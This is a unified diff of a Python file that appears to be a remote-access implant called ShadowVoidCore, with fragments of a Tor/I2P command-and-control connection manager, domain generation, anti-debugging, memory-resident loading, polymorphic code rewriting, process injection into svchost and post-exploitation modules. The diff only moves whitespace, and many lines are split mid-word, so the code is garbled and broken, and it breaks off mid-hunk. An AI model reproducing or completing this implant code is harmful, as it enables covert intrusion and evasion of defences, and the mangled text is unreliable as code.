@@ -82,6 +82,7 @@ CONFIG = {
         'net': {'enabled': True, 'path': 'modules.net'},
         'web': {'enabled': True, 'path': 'modules.web'},
         
+
         'onion': {'enabled': True, 'path': 'modules.onion'},
         'post_exploit': {'enabled': True, 'path': 'modules.post_exploit'},
         'process_injection': {'enabled': True, 'path': 'modules.process_injection'}
@@ -153,9 +154,8 @@ def make_memory_resident():
                 raise ImportError(f"Module {name} not in memory cache")
 
         memory_loader = MemoryModuleLoader()
-        if
-
- memory_loader not in sys.meta_path:
+ 
+       if memory_loader not in sys.meta_path:
             sys.meta_path.insert(0, memory_loader)
         return True
     except Exception as e:
@@ -209,7 +209,8 @@ def load_modules():
                         spec.loader.exec_module(module)
                         MODULES[name] = module
             except Exception as e:
-                print('Fa
+               
+ print('Fa
 i
 led to load module ' + name + ': ' + str(e))
 
@@ -287,7 +288,8 @@ def anti_debug_check():
         if platform.system() == 'Linux':
             with open('/proc/self/status', 'r') as f:
                 for line in f:
-                    if line.s
+                  
+  if line.s
 ta
 rtswith('TracerPid:'):
                         pid = int(line.split()[1])
@@ -348,9 +350,8 @@ class AES256GCM:
             from Crypto.Cipher import AES
             nonce = os.urandom(self.nonce_size)
             cipher = AES.new(self.key, AES.MODE_GCM, nonce=nonce)
-            cip
-her
-text, tag = cipher.encrypt_and_digest(plaintext)
+   
+         ciphertext, tag = cipher.encrypt_and_digest(plaintext)
             return nonce + tag + ciphertext
         except ImportError:
             nonce = os.urandom(self.nonce_size)
@@ -399,7 +400,8 @@ class DomainGenerator:
 
 # C2 Connection Manager
 class C2Connection:
-    """Persistent 
+    "
+""Persistent 
 C2 c
 onnection with automatic Tor/I2P fallback"""
     
@@ -451,7 +453,8 @@ onnection with automatic Tor/I2P fallback"""
             return False
 
     def make_request(self, url, method='GET', data=None, headers=None, encrypt=True):
-        """Make a request through C2 connection with automatic 
+        """Make a request through C2 connection w
+ith automatic 
 fallb
 ack"""
         try:
@@ -506,7 +509,8 @@ ack"""
         return True
 
     def _persistent_loop(self):
-        """Persistent connecti
+        """Pers
+istent connecti
 on loo
 p"""
         while self.running:
@@ -567,7 +571,8 @@ class I2PRouter:
                 result = subprocess.run(['pgrep', '-x', 'i2pd'], capture_output=True)
                 return result.returncode == 0
             return False
-        except:
+        e
+xcept:
          
    retu
 rn False
@@ -628,6 +633,7 @@ class HeartbeatManager:
         self.jitter = jitter
         self.kill_switch = kill_switch
         self.running = False
+
         self.last
 _heartbe
 at = datetime.now()
@@ -682,7 +688,8 @@ at = datetime.now()
             except:
                 pass
             return True
-        return False
+        return
+ False
 
     def st
 op(self):
@@ -750,7 +757,8 @@ def polymorphic_code(original_code):
                 elif isinstance(node.ctx, ast.Load):
                     if node.id in self.var_map:
                         node.id = self.var_map[node.id]
-                return node
+            
+    return node
    
      tree 
 = VariableRenamer().visit(tree)
@@ -817,10 +825,10 @@ class ShadowVoidCore:
         except:
             pass
 
-    def initialize_memory_resident(self):
+    def initialize_memory_
+resident(self):
     
-    """Init
-ialize memory-resident execution capability"""
+    """Initialize memory-resident execution capability"""
         try:
             make_memory_resident()
             # Cache core modules in memory
@@ -863,10 +871,10 @@ ialize memory-resident execution capability"""
             pass
 
     def start_session(self):
-        SESSION['active'] = True
+        SESSION[
+'active'] = True
     
-    SESSION[
-'start_time'] = datetime.now()
+    SESSION['start_time'] = datetime.now()
         SESSION['targets'] = []
         SESSION['compromised'] = []
         SESSION['last_heartbeat'] = datetime.now()
@@ -924,7 +932,8 @@ ialize memory-resident execution capability"""
 
     def cmd_scan(self, args):
         if not args:
-            return {'status': 'error', 'message': 'Tar
+            return {'status': 'e
+rror', 'message': 'Tar
 get required'
 }
         target = args[0]
@@ -969,7 +978,8 @@ get required'
             target = args[1] if len(args) > 1 else 'svchost'
             return injector.migrate_to_process(target)
         elif subcmd == 'spawn':
-            target = args[1] if len(args) >
+            target =
+ args[1] if len(args) >
  1 else 'svcho
 st'
             return injector.spawn_and_inject(target)
@@ -988,6 +998,6 @@ st'
         if len(args) < 2:
             return {'status': 'error', 'message': 'Source and destination required'}
         source = args[0]
-        destination = args[1]
+     
 
 ... [Content truncated]
